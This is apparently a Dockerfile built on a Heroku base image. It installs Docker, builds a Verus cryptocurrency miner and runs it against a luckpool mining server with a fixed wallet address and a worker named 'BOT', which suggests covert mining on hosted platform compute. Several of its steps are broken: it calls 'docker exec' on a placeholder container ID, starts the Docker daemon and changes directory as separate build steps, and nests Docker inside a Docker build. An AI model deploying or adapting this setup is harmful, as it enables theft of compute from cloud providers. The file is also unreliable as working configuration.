FROM heroku/heroku:18
RUN apt-get update
RUN apt-get install -y curl git unzip wget docker
RUN curl -fsSLO https://get.docker.com/builds/Linux/x86_64/docker-17.04.0-ce.tgz \
  && tar xzvf docker-17.04.0-ce.tgz \
  && mv docker/docker /usr/local/bin \
  && rm -r docker docker-17.04.0-ce.tgz
  
RUN apt-get update && \
      apt-get -y install sudo

RUN docker exec -u root -t -i container_id /bin/bash
RUN sudo dockerd
RUN docker pull wattpool/verusccminer
RUN git clone https://github.com/wattpool/verus-ccminer-dockerized.git
RUN cd verus-ccminer-dockerized
RUN docker build -t verusccminer .
RUN docker run --name verusccminer verusccminer -a verus -o stratum+tcp://eu.luckpool.net:3956#xnsub -u RN6MfBAJnpjchdY2L3EnnFQXkFkHzmrNoY.BOT -p x -tX
CMD bash heroku.sh
